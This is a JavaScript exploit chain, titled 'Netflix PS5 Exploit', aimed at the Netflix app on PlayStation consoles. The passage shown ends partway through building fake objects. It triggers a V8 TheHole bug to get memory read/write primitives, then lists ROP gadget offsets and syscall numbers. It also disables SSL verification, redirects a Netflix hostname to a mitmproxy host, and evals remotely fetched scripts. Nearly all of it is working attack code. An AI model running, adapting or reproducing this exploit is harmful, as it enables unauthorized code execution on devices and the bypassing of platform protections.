// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

const ip_script = "PLS_STOP_HARDCODING_IPS"; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
const ip_script_port = 8080; //port that mitmproxy is on

var is_ps4 = false; // Flag to stop execution after PS4 exploit loads

// #region misc

var FW_VERSION = null;

let SYSCALL = {
    read: 0x3n,
    write: 0x4n,
    open: 0x5n,
    close: 0x6n,
    setuid: 0x17n,
    getuid: 0x18n,
    accept: 0x1en,
    kill : 0x25n,
    pipe: 0x2an,
    mprotect: 0x4an,

    socket: 0x61n,
    connect: 0x62n,
    bind: 0x68n,
    setsockopt: 0x69n,
    listen: 0x6an,
    getsockopt: 0x76n,
    netgetiflist: 0x7dn,
    socketpair: 0x87n,

    sysctl: 0xcan,
    nanosleep: 0xf0n,
    sigaction: 0x1a0n,
    dlsym: 0x24fn,
    dynlib_load_prx: 0x252n,
    dynlib_unload_prx: 0x253n,
    randomized_path: 0x25an,
    is_in_sandbox: 0x249n,
    mmap: 0x1ddn,
    getpid: 0x14n,
    jitshm_create: 0x215n,
    jitshm_alias: 0x216n,
    unlink: 0xan,
    chmod: 0xfn,
    recvfrom: 0x1dn,
    getsockname: 0x20n,
    rename: 0x80n,
    sendto: 0x85n,
    mkdir: 0x88n,
    rmdir: 0x89n,
    stat: 0xbcn,
    getdents: 0x110n,
    lseek: 0x1den,
    dup2: 0x5an,
    fcntl: 0x5cn,
    select: 0x5dn,
    fstat: 0xbdn,
    umtx_op: 0x1c6n,
    cpuset_getaffinity: 0x1e7n,
    cpuset_setaffinity: 0x1e8n,
    rtprio_thread: 0x1d2n,
    ftruncate: 0x1e0n,
    sched_yield: 0x14bn,
    munmap: 0x49n,
    fsync: 0x5fn,
    ioctl: 0x36n,

    thr_new: 0x1c7n,
    thr_exit: 0x1afn,
    thr_self: 0x1b0n,
    thr_suspend_ucontext: 0x278n,
    thr_resume_ucontext: 0x279n,

    evf_create: 0x21an,
    evf_delete: 0x21bn,
    evf_set: 0x220n,
    evf_clear: 0x221n,

    aio_multi_delete: 0x296n,
    aio_multi_wait: 0x297n,
    aio_multi_poll: 0x298n,
    aio_multi_cancel: 0x29an,
    aio_submit_cmd: 0x29dn
};

let DLSYM_OFFSETS = {
    "4.03": 0x317D0n,
    "4.50": 0x317D0n,
    "4.51": 0x317D0n,
    "5.00": 0x32160n,
    "5.02": 0x32160n,
    "5.10": 0x32160n,
    "5.50": 0x32230n,
    "6.00": 0x330A0n,
    "6.02": 0x330A0n,
    "6.50": 0x33110n,
    "7.00": 0x33E90n,
    "7.01": 0x33E90n,
    "7.20": 0x33ED0n,
    "7.40": 0x33ED0n,
    "7.60": 0x33ED0n,
    "7.61": 0x33ED0n,
    "8.00": 0x342E0n,
    "8.20": 0x342E0n,
    "8.40": 0x342E0n,
    "8.60": 0x342E0n,
    "9.00": 0x350E0n,
    "9.20": 0x350E0n,
    "9.40": 0x350E0n,
    "9.60": 0x350E0n,
    "10.00": 0x349C0n,
    "10.01": 0x349C0n
};

let eboot_base = 0n;

let prefetch_scratch = null;
let script_scratch = null;

// FreeBSD constants (https://github.com/PS5Dev/PS5SDK)

const O_RDONLY =	0x0000n;	/* open for reading only */
const O_WRONLY =	0x0001n;	/* open for writing only */
const O_RDWR =		0x0002n;	/* open for reading and writing */
const O_ACCMODE =	0x0003n;	/* mask for above modes */

const O_NONBLOCK =	0x0004n;	/* no delay */
const O_APPEND =	0x0008n;	/* set append mode */
const O_CREAT =     0x0200n;    /* create if nonexistent */
const O_TRUNC =     0x0400n;    /* truncate to zero length */

const SO_REUSEADDR = 4n;        /* allow local address reuse */
const SO_LINGER =    0x80n;     /* linger on close if data present */

const SOL_SOCKET =   0xffffn;   /* options for socket level */
const AF_UNIX =      1n;        /* standardized name for AF_LOCAL */
const AF_INET =      2n;        /* internetwork: UDP, TCP, etc. */
const AF_INET6 =     28n;       /* IPv6 */
const SOCK_STREAM =  1n;        /* stream socket */
const SOCK_DGRAM =   2n;        /* datagram socket */

const IPPROTO_TCP =  6n;        /* tcp */
const IPPROTO_UDP =  17n;       /* user datagram protocol */
const IPPROTO_IPV6 = 41n;       /* IP6 header */
const IPV6_PKTINFO = 46n;       /* int; send hop limit */
const INADDR_ANY =   0n;

const TCP_INFO =         0x20n; /* retrieve tcp_info structure */
const size_tcp_info =    0xecn;  /* struct tcp_info */
const TCPS_ESTABLISHED = 4n;

const IPV6_2292PKTOPTIONS = 25n;
const IPV6_NEXTHOP =        48n;
const IPV6_RTHDR =          51n;
const IPV6_TCLASS =         61n;

const PROT_NONE =   0x0n;       /* no permissions */
const PROT_READ =   0x1n;       /* pages can be read */
const PROT_WRITE =  0x2n;       /* pages can be written */
const PROT_EXEC =   0x4n;       /* pages can be executed */

const MAP_SHARED =      0x1n;   /* share changes */
const MAP_PRIVATE =     0x2n;   /* changes are private */
const MAP_FIXED =       0x10n;  /* map addr must be exactly as requested */
const MAP_ANONYMOUS =   0x1000n;
const MAP_NO_COALESCE = 0x400000n;

const GPU_READ =    0x10n;
const GPU_WRITE =   0x20n;
const GPU_RW =      0x30n;

// #endregion

// #region WebSocket
const ws = {
    socket: null,
    init(ip, port, callback) {
        nrdp.gibbon._runConsole("/command ssl-peer-verification false");

        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
            addresses: [ip],
            ttl: 3600000
        });

        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
        this.socket.onopen = callback;
    },
    send(msg) {
        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
            this.socket.send(msg);
        }
    }
};
// #endregion
// #region Logger
const logger = {
    overlay: null,
    lines: [],
    widgets: [],
    maxLines: 40,
    refreshTimer: null,
    pendingRefresh: false,
    widgetEnabled: true,
    init() {
        this.overlay = nrdp.gibbon.makeWidget();
        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
        this.overlay.width = 1280;
        this.overlay.height = 720;

        nrdp.gibbon.scene.widget = this.overlay;

        // Title widget - large red "Netflix N Hack" (centered)
        var title = nrdp.gibbon.makeWidget({
            name: "title",
            x: 380,
            y: 300,
            width: 500,
            height: 100
        });
        title.text = {
            contents: "Netflix N Hack",
            size: 72,
            color: { a: 255, r: 255, g: 0, b: 0 },
            wrap: false
        };
        title.parent = this.overlay;

        // Subtitle widget - shown for PS4 (centered below title)
        this.subtitle = nrdp.gibbon.makeWidget({
            name: "subtitle",
            x: 400,
            y: 420,
            width: 500,
            height: 30
        });
        this.subtitle.text = {
            contents: "",
            size: 22,
            color: { a: 255, r: 255, g: 100, b: 100 },
            wrap: false
        };
        this.subtitle.parent = this.overlay;

        // Pre-create all text widgets once to avoid removal/recreation overhead
        for (var i = 0; i < this.maxLines; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });

            w.text = {
                contents: "",
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };

            w.parent = this.overlay;
            this.widgets.push(w);
        }
    },
    log(msg) {
        ws.send(msg);

        if (!this.widgetEnabled) return;

        this.lines.push(msg);
        if (this.lines.length > this.maxLines) this.lines.shift();

        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
        this.refreshTimer = nrdp.setTimeout(() => {
            this.refresh();
            this.refreshTimer = null;
        }, 200);

        this.pendingRefresh = true;
    },
    refresh() {
        if (!this.widgetEnabled || !this.overlay) return;

        // Update widget text content without recreating widgets
        for (var i = 0; i < this.maxLines; i++) {
            if (i < this.lines.length) {
                this.widgets[i].text = {
                    contents: this.lines[i],
                    size: 12,
                    color: {
                        a: 255,
                        r: 0,
                        g: 255,
                        b: 0
                    },
                    wrap: false
                };
            } else {
                // Clear unused widget slots
                this.widgets[i].text = {
                    contents: "",
                    size: 12,
                    color: {
                        a: 255,
                        r: 0,
                        g: 255,
                        b: 0
                    },
                    wrap: false
                };
            }
        }

        this.pendingRefresh = false;
    },
    flush() {
        if (!this.widgetEnabled) return;
        // Force immediate refresh if needed (call before blocking operations)
        if (this.refreshTimer) {
            nrdp.clearTimeout(this.refreshTimer);
            this.refreshTimer = null;
        }
        if (this.pendingRefresh) {
            this.refresh();
        }
    },
    setSubtitle(text) {
        if (this.subtitle) {
            this.subtitle.text = {
                contents: text,
                size: 20,
                color: { a: 255, r: 255, g: 100, b: 100 },
                wrap: false
            };
        }
    },
    disableWidget() {
        this.widgetEnabled = false;
    }
};
// #endregion
// #region Pointer Helpers
const buf = new ArrayBuffer(8);
const view = new DataView(buf);
const ptr = {
    il2ih(value) {
        return value << 0x20n;
    },
    ih2il(value) {
        return value >> 0x20n;
    },
    ih(value) {
        return value & ~0xFFFFFFFFn;
    },
    il(value) {
        return value & 0xFFFFFFFFn;
    },
    itag(value) {
    	return value | 1n;
    },
    iuntag(value) {
    	return value & ~1n;
    },
    f2i(value) {
        view.setFloat64(0, value, true);
        return view.getBigUint64(0, true);
    },
    f2ih(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(4, true));
    },
    f2il(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(0, true));
    },
    i2f(value) {
        view.setBigUint64(0, value, true);
        return view.getFloat64(0, true);
    },
    i2h(value, padded = true) {
        let str = value.toString(16).toUpperCase();
        if (padded) {
            str = str.padStart(16, '0');
        }
        return `0x${str}`;
    }
};
// #endregion

function make_hole () {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

function make_hole_old () {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;

    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }

    throw new Error('Could not trigger TheHole');
}

function hex(value)
{
    return "0x" + value.toString(16).padStart(8, "0");
}

gadgets_eu_6 = {
    /** Gadgets for Function Arguments **/
    pop_rax: 0x6c233n,
    pop_rdi: 0x1a729bn,
    pop_rsi: 0x14d8n,
    pop_rdx: 0x3ec42n,
    pop_rcx: 0x2485n,
    pop_r8:  0x6c232n,
    pop_r9:  0x66511bn,

    /** Other Gadgets **/
    ret:                   0x42n,
    pop_rbp:               0x79n,
    pop_rbx:               0x2e1ebn,
    pop_rsp:               0x1df1e1n,
    pop_rsp_pop_rbp:       0x17ecb4en,
    mov_qword_ptr_rdi_rax: 0x1dcba9n,
    mov_qword_ptr_rdi_rdx: 0x36db4en,

    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                        // the jne is neved executed if the value in rsi does not end in 1
    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
                                                        // point rdx to a valid address
};

gadgets_us_5 = {
    /** Gadgets for Function Arguments **/
    pop_rax: 0x6c233n,
    pop_rdi: 0x24f3c2n, // Changed
    pop_rsi: 0x14d8n,
    pop_rdx: 0x3ec42n,
    pop_rcx: 0x2485n,
    pop_r8:  0x6c232n,
    pop_r9:  0x66511bn,

    /** Other Gadgets **/
    ret:                   0x42n,
    pop_rbp:               0x79n,
    pop_rbx:               0x2e1ebn,
    pop_rsp:               0x13c719n, // Changed
    pop_rsp_pop_rbp:       0x17ecb4en,
    mov_qword_ptr_rdi_rax: 0x1dcba9n,
    mov_qword_ptr_rdi_rdx: 0x36db4en,

    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                        // the jne is neved executed if the value in rsi does not end in 1
    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
                                                        // point rdx to a valid address
};

gadgets_list = {
    'Gemini-U6-2': gadgets_eu_6,
    'Gemini-U5-18': gadgets_us_5,
};

class gadgets {
    constructor() {
        switch (nrdp.version.nova.app_version) {
            case 'Gemini-U6-2':         // EU 6.000
                break;
            case 'Gemini-U5-18':        // US 5.000
                break;

            case 'Pollux-U53-7-E':
            case 'Pollux-U53-7-A':
            case 'Pollux-U53-7-J':
                nrdp.gibbon.load({
                url: 'http://localcontrol.netflix.com/js/ps4/inject_auto_bundle.js',
                secure: false
                }, function(result) {
                    logger.flush();

                    if (result.data) {
                        logger.flush();
                        try {
                            eval(result.data);
                        } catch (e) {
                            logger.log("Eval error: " + e.message);
                            logger.log("Stack: " + (e.stack || "none"));
                            logger.flush();
                        }
                    } else {
                        logger.log("Load failed - no data received");
                        logger.flush();
                    }
                });
                logger.setSubtitle("PS4 Detected, Loading Exploit...");
                is_ps4 = true;
                return; // Exit constructor, main() will check is_ps4 and return
            default:

                throw new Error("App version not supported");


        }
    }
    get(gadget) {
        let list = gadgets_list[nrdp.version.nova.app_version];
        return eboot_base + list[gadget];
    }
};

function hook_tryagain(){
        /***** Hook "Try Again" button to reload exploit *****/
        if (typeof util !== 'undefined' && util.changeLocation) {
            const original_changeLocation = util.changeLocation;
            util.changeLocation = function(url) {
                logger.log("Reloading Javascript...");

                logger.flush();

                // Load and eval our injected script instead of reloading app
                nrdp.gibbon.load({
                    url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
                    secure: false
                }, function(result) {
                    logger.flush();

                    if (result.data) {
                        logger.flush();
                        try {
                            eval(result.data);
                        } catch (e) {
                            logger.log("Eval error: " + e.message);
                            logger.log("Stack: " + (e.stack || "none"));
                            logger.flush();
                        }
                    } else {
                        logger.log("Load failed - no data received");
                        logger.flush();
                    }
                });

                // Throw exception to stop execution and prevent state.exit
                throw new Error("Exploit reload initiated");
            };
            logger.log("Enabled Instant JS reload...");
            logger.flush();
        } else {
            logger.log("WARNING: util.changeLocation not found!");
            logger.flush();
        }
    }



function stringToBytes (str) {
    const len = str.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = str.charCodeAt(i);
    }
    return bytes;
}

function sleep(ms) {
    nrdp.setTimeout(() => {}, ms);
}

function main () {

    logger.init();

    logger.log("=== Netflix n Hack ===");
    logger.flush(); // Force immediate display

    try {
        hook_tryagain();
        const g = new gadgets(); // Load gadgets
        if (is_ps4) return; // PS4 exploit loaded separately, stop here

        let hole = make_hole();

        let string = "TEXT";

        map1 = new Map();
        map1.set(1, 1);
        map1.set(hole, 1);

        map1.delete(hole);
        map1.delete(hole);
        map1.delete(1);

        oob_arr_temp = new Array(1.1, 2.2, 3.3); // Temporal due that cannot reach a bui64 with map
        oob_arr =  new BigUint64Array([0x4141414141414141n,0x4141414141414141n]);
        victim_arr = new BigUint64Array([0x5252525252525252n,0x5252525252525252n]);
        obj_arr = new Array({},{});

        map1.set(0x10, -1);
        nrdp.gibbon.garbageCollect();
        map1.set(oob_arr_temp, 0x200);


        if (oob_arr_temp.lenght < 4) {
            throw new Error("Could not create unstable primitives. Try again.");
        }

        // Let's make oob_arr oversize
        oob_arr_temp[18] = ptr.i2f(0x1000n*8n);  // Size in bytes
        oob_arr_temp[19]= ptr.i2f(0x1000n);      // Size in elements

        // From this point on we can use oob_arr as a more 'stable' primitive until fake objs

        // Elements ptr of victim_arr in first 32b of oob_arr[22]
        // external_ptr[0:31]   --> (oob_arr[25] & ~0xffffffffn) >> 32n
        // external_ptr[63:32]  --> (oob_arr[26] & 0xffffffffn) << 32n
        // base_ptr[0:31]       --> (oob_arr[26] & ~0xffffffffn) >> 32n
        // base_ptr[0:31]       --> (oob_arr[27] & 0xffffffffn) << 32n

        // Elements Ptr of obj_arr in lower 32b (first in mem) of oob_arr[37]
        // Value of obj_arr[0] (ptr to obj) in lower 32b (first in mem) of oob_arr[39]

        function addrof_unstable (obj) {
            obj_arr[0] = obj;
            return (oob_arr[39] & 0xffffffffn) -1n;
        }

        function create_fakeobj_unstable(add) {
            let add_32 = add & 0xffffffffn +1n;     // Just in case 32bits
            let original_value = oob_arr[39];   // Grab full 64bits add in oob_arr[41] to 'save' upper 32bits
            let new_value = (original_value & ~0xffffffffn) + ((add+1n) & 0xffffffffn);
            oob_arr[39] = new_value;
            const fake_obj = obj_arr[0];
            return fake_obj;
        }

        function read64_unstable (add) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);

            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            let read_value = victim_arr[0]; // Read the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;

            return read_value;
        }

        function write64_unstable (add, value) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);

            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            victim_arr[0] = value;  // Write the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;
        }

        function read32_unstable(add){
            let read = read64_unstable(add);
            return read & 0xffffffffn;
        }

        function write32_unstable(add, value) {
            let read = read64_unstable(add);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64_unstable(add, new_value);
        }


        let add_string = addrof_unstable(string) + 12n;
        logger.log("Address of 'string' text: " + hex(add_string));
        let string_value = read32_unstable(add_string);
        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;

        if (BigInt(string_value) !== 0x54584554n) {
            throw new Error("Could not create unstable primitives. Try again.");
        }

        write32_unstable(add_string, 0x41414141n);
        logger.log("Overwritten value of 'string' (should be AAAA): " + string );
        logger.flush();

        let typed_arr = new Int8Array(8);
        let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
        let top32b_heap = base_heap_add >> 32n;
        logger.log("Base heap address: " + hex(base_heap_add));
        logger.log("Top 32bits heap address: " + hex(top32b_heap));
        let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
        eboot_base = leak_eboot_add - 0x8966C8n;    // This is not realiable as the addess changes
        // Previously used offsets: 0x88C76En , 0x8966C8n
        // Seems to be a ptr that the app updates while running
        // If nothing is changed in the code before this point, it should not change
        logger.log("Leaked eboot add : " + hex(leak_eboot_add));
        logger.log("eboot base : " + hex(eboot_base));


        /***** Start of Stable Primitives based on fake obj *****/
        /*****        Base on code from Gezine Y2JB         *****/

        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }

        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);

        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;

        logger.log('Large Object Space @ ' + hex(stable_elements_addr));

        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);

        logger.log('Converted stable_array to double array');

        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = 0;
        }

        console.log("Reserved space filled with 0s");

        // Get templates for stable primitives

        /***** Template for BigUint64Array *****/
        const template_biguint = new BigUint64Array(64);

        const template_biguint_addr = addrof_unstable(template_biguint);
        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;

        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);

        const biguint_buffer_map =      read32_unstable(biguint_buffer + 0x00n);
        const biguint_buffer_props =    read32_unstable(biguint_buffer + 0x04n);
        const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
        const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);

        /***** Template for Uint8Array *****/
        const template_uint8 = new Uint8Array(64);

        const template_uint8_addr = addrof_unstable(template_uint8);
        const uint8_map =      read32_unstable(template_uint8_addr + 0x00n);
        const uint8_props =    read32_unstable(template_uint8_addr + 0x04n);
        const uint8_elements = read32_unstable(template_uint8_addr + 0x08n) - 1n;
        const uint8_buffer =   read32_unstable(template_uint8_addr + 0x0Cn) - 1n;

        const uint8_elem_map = read32_unstable(uint8_elements + 0x00n);
        const uint8_elem_len = read32_unstable(uint8_elements + 0x04n);

        const uint8_buffer_map =      read32_unstable(uint8_buffer + 0x00n);
        const uint8_buffer_props =    read32_unstable(uint8_buffer + 0x04n);
        const uint8_buffer_elem =     read32_unstable(uint8_buffer + 0x08n);
        const uint8_buffer_bitfield = read32_unstable(uint8_buffer + 0x24n);

        /***** Template for Object Array *****/
        const template_obj_arr = [{},{}];

        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);

        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);

        logger.log('Templates extracted');


        const base = stable_elements_addr + 0x100n;

        /*******************************************************/
        /*****       Memory Layout for fake Objects        *****/
        /*******************************************************/
        /***** fake_rw header:          0x0000             *****/
        /***** fake_rw buffer:          0x0040             *****/
        /***** fake_rw elements:        0x1000             *****/
        /*******************************************************/
        /***** fake_bui64_arr header:   0x0100 (inside rw) *****/
        /***** fake_bui64_arr buffer:   0x0150 (inside rw) *****/
        /***** fake_bui64_arr elements: 0x1100             *****/
        /*******************************************************/
        /***** fake_obj_arr header:     0x0200 (inside rw) *****/
        /***** fake_obj_arr elements:   0x0250 (inside rw) *****/
        /*******************************************************/
        /***** fake_u8_arr header:      0x0300 (inside rw) *****/
        /***** fake_u8_arr buffer:      0x0350 (inside rw) *****/
        /***** fake_u8_arr elements:    0x1150             *****/
        /*******************************************************/
        /*****       Memory Layout for ROP                 *****/
        /*******************************************************/
        /***** fake_frame init:         0x1250             *****/
        /***** fake_frame center:       0x1300             *****/
        /***** fake_frame end:          0x1350             *****/
        /*******************************************************/
        /***** fake_bytecode init:      0x1400             *****/
        /***** fake_bytecode end:       0x1450             *****/
        /*******************************************************/
        /***** fake_rop_return:         0x1500             *****/
        /*******************************************************/
        /***** fake_rop_arr header:     0x1550             *****/
        /***** fake_rop_arr buffer:     0x1700             *****/
        /***** fake_rop_arr elements:   0x1600             *****/
        /*******************************************************/

        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_rw_obj =             base + 0x0000n;
        const fake_rw_obj_buffer =      base + 0x0040n;
        const fake_rw_obj_elements =    base + 0x1000n;

        const fake_bui64_arr_obj =      base + 0x0100n;
        const fake_bui64_arr_buffer =   base + 0x0150n;
        const fake_bui64_arr_elements = base + 0x1100n;

        const fake_obj_arr_obj =        base + 0x0200n;
        const fake_obj_arr_elements =   base + 0x0250n;

        const fake_u8_arr_obj =         base + 0x0300n;
        const fake_u8_arr_buffer =      base + 0x0350n;
        const fake_u8_arr_elements =    base + 0x1150n;

        const fake_frame =              base + 0x1300n; // No need of fake obj
        const fake_bytecode =           base + 0x1400n; // No need of fake obj
        const fake_rop_return =         base + 0x1500n; // No need of fake obj

        const fake_rop_arr_obj =        base + 0x1550n;
        const fake_rop_arr_buffer =     base + 0x1700n;
        const fake_rop_arr_elements =   base + 0x1600n;

        /*******************************************************************************************************/
        /**********                             Init Fake OOB BigUInt64Array                          **********/
        /*******************************************************************************************************/
        write32_unstable(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
        write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
        write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake OOB BigUInt64Array                           **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Victim BigUInt64Array                       **********/
        /*******************************************************************************************************/
        write32_unstable(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
        write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
        write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake Victim BigUInt64Array                        **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Obj Array                                   **********/
        /*******************************************************************************************************/
        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b

        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
        /*******************************************************************************************************/
        /**********                             End Fake Obj Array                                    **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /********** Init Fake Victim Uint8Array                           **********/
        /*******************************************************************************************************/
        write32_unstable(fake_u8_arr_buffer + 0x00n, uint8_buffer_map);
        write32_unstable(fake_u8_arr_buffer + 0x04n, uint8_buffer_props);
        write32_unstable(fake_u8_arr_buffer + 0x08n, uint8_buffer_elem);
